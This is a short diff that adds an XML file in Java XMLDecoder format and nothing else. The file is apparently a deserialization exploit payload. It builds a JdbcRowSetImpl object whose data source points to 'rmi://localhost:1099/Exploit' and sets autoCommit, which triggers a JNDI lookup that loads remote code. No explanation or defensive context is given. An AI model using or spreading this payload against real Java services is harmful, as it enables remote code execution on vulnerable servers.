@@ -1,0 +1,10 @@
+<java>
+    <void class="com.sun.rowset.JdbcRowSetImpl">
+        <void property="dataSourceName">
+            <string>rmi://localhost:1099/Exploit</string>
+        </void>
+        <void property="autoCommit">
+            <boolean>true</boolean>
+        </void>
+    </void>
+</java>
